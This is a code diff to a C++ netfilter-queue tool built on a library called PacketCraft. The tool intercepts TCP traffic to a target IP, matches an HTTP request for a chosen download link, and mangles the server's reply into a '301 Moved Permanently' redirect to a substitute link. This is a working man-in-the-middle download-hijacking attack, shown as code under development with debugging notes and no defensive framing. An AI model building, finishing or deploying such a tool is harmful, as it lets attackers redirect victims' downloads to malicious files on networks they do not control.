@@ -115,6 +115,14 @@ bool32 FilterResponse(tcphdr* tcpHeader, char* payload, uint32_t requestAckNum)
     return FALSE;
 }
 
+int CreateResponsePayload(char* buffer, size_t bufferLen, const char* newDownloadLink)
+{
+    const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
+    uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
+    PacketCraft::ConcatStr(buffer, responseCodeLen, httpStatusCode, newDownloadLink);
+    return NO_ERROR;
+}
+
 bool32 requestFiltered{FALSE};
 uint32_t requestAckNum{0};
 
@@ -137,8 +145,7 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
         return -1;
     }
 
-    std::cout << "packet received: id: " << ntohl(ph->packet_id) << ", bytes: " << len << "\n";
-    std::cout << "req ack num: " << ntohl(requestAckNum) << (requestFiltered == TRUE ? "true" : "false") << "\n";
+    std::cout << "packet received: id: " << ntohl(ph->packet_id) << ", bytes: " << len << " hw proto: " << ntohs(ph->hw_protocol) << std::endl;
 
     pkt_buff* pkBuff = pktb_alloc(callbackData.ipVersion, rawData, len, 0);
     if(pkBuff == nullptr)
@@ -148,12 +155,14 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
         return -1;
     }
 
+    uint32_t ethProto = ntohs(ph->hw_protocol);
     iphdr* ipv4Header{nullptr};
     ip6_hdr* ipv6Header{nullptr};
     tcphdr* tcpHeader{nullptr};
     bool32 hasTCPLayer{FALSE};
 
-    if(callbackData.ipVersion == AF_INET)
+
+    if(ethProto == ETH_P_IP)
     {
         ipv4Header = nfq_ip_get_hdr(pkBuff);
         if(ipv4Header == nullptr)
@@ -186,18 +195,18 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
             sockaddr_in targetAddr{};
             inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
             if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
-                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);     
+                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);
         }
         //////////////////////////
     }
-    else
+    else if(ethProto == ETH_P_IPV6)
     {
         ipv6Header = nfq_ip6_get_hdr(pkBuff);
         if(ipv6Header == nullptr)
         {
             pktb_free(pkBuff);
             LOG_ERROR(APPLICATION_ERROR, "pktb_network_header()");
-            return APPLICATION_ERROR;
+            return -1;
         }
 
         int res = nfq_ip6_set_transport_header(pkBuff, ipv6Header, IPPROTO_TCP);
@@ -248,24 +257,11 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
             return -1;
         }
 
+        // payload len includes the header and options size, so we need to subtract those
         unsigned int payloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
         payloadLen -= 4 * tcpHeader->th_off;
 
-        std::cout << "packet:n";
-        char buf[PC_IPV4_MAX_STR_SIZE]{};
-        PacketCraft::ConvertIPv4LayerToString(buf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
-        std::cout << buf << "\n";
-
-/*
-        std::cout << "ack: " << ntohl(tcpHeader->ack_seq) << " seq: " << ntohl(tcpHeader->seq) << "\n";
-        for(unsigned int i = 0; i < payloadLen; ++i)
-        {
-            std::cout << ((char*)payload)[i];
-        }
-
-        std::cout << std::endl;
-*/
-
+        std::cout << "payload len was " << payloadLen << std::endl;
         
         if(requestFiltered == FALSE) // filter for the correct request and get its ack number
         {
@@ -273,6 +269,12 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
             if(FilterRequest(callbackData.downloadLink, tcpHeader, (char*)payload, requestAckNum) == TRUE)
             {
                 std::cout << "request filtered\n";
+                for(unsigned int i = 0; i < payloadLen; ++i)
+                {
+                    std::cout << ((char*)payload)[i];
+                }
+                std::cout << std::endl;
+
                 requestFiltered = TRUE;
             }
         }
@@ -281,17 +283,70 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
             std::cout << "filtering response...\n";
             if(FilterResponse(tcpHeader, (char*)payload, requestAckNum) == TRUE)
             {
-                // TODO: edit the payload!
+                // NOTE IMPORTANT TODO: bug somewhere below this line because if we uncomment this return verdict, the packet will be
+                // dropped as expected. However if we try to drop the packet after mangling, it will not be dropped.
+                // Something goes wrong with the mangling process. Also we may need to do something about the 
+                // ack/seq numbers when we edit the payload. Also there is a bug because some wierd stuff gets printed in the console. Possibly
+                // something left over in a buffer.
+                // return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_DROP, pktb_len(pkBuff), pktb_data(pkBuff));
+
                 std::cout << "response filtered\n";
+                for(unsigned int i = 0; i < payloadLen; ++i)
+                {
+                    std::cout << ((char*)payload)[i];
+                }
+                std::cout << std::endl;
+
+                char httpResponse[1024]{};
+                CreateResponsePayload(httpResponse, 1024, callbackData.newDownloadLink);
+                uint32_t newResponseLen = PacketCraft::GetStrLen(httpResponse);
+
+                if(ethProto == ETH_P_IP)
+                {
+                    std::cout << "before mangling\n";
+                    char ipStrBuf[PC_IPV4_MAX_STR_SIZE]{};
+                    PacketCraft::ConvertIPv4LayerToString(ipStrBuf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
+                    std::cout << ipStrBuf << std::endl;
+                    memset(ipStrBuf, 0, PC_IPV4_MAX_STR_SIZE);
+
+                    char tcpStrBuf[PC_TCP_MAX_STR_SIZE]{};
+                    PacketCraft::ConvertTCPLayerToString(tcpStrBuf, PC_TCP_MAX_STR_SIZE, (TCPHeader*)tcpHeader);
+                    std::cout << tcpStrBuf << std::endl;
+                    memset(tcpStrBuf, 0, PC_TCP_MAX_STR_SIZE);
+
+                    if(nfq_tcp_mangle_ipv4(pkBuff, 4 * tcpHeader->th_off, payloadLen, httpResponse, newResponseLen) < 0)
+                    {
+                        pktb_free(pkBuff);
+                        requestFiltered = FALSE;
+                        requestAckNum = 0;
+                        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
+                        return -1;
+                    }
+
+                    std::cout << "after mangling\n";
+                    PacketCraft::ConvertIPv4LayerToString(ipStrBuf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
+                    std::cout << ipStrBuf << std::endl;
+
+                    PacketCraft::ConvertTCPLayerToString(tcpStrBuf, PC_TCP_MAX_STR_SIZE, (TCPHeader*)tcpHeader);
+                    std::cout << tcpStrBuf << std::endl;
+                }
+                else if(ethProto == ETH_P_IPV6)
+                {   
+                    if(nfq_tcp_mangle_ipv6(pkBuff, 4 * tcpHeader->th_off, payloadLen, httpResponse, newResponseLen) < 0)
+                    {
+                        pktb_free(pkBuff);
+                        requestFiltered = FALSE;
+                        requestAckNum = 0;
+                        LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_mangle() error");
+                        return -1;
+                    }
+                }   
+
+                requestFiltered = FALSE;
+                requestAckNum = 0;
+                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
             }
         }
-
-        if(ipv4Header != nullptr)
-            nfq_tcp_compute_checksum_ipv4(tcpHeader, ipv4Header);
-        else if(ipv6Header != nullptr)
-            nfq_tcp_compute_checksum_ipv6(tcpHeader, ipv6Header);
-
-        return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
     }
 
     return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);
@@ -350,5 +405,6 @@ int main(int argc, char** argv)
         return APPLICATION_ERROR;
     }
 
+    std::cout << std::flush;
     return NO_ERROR;    
 }
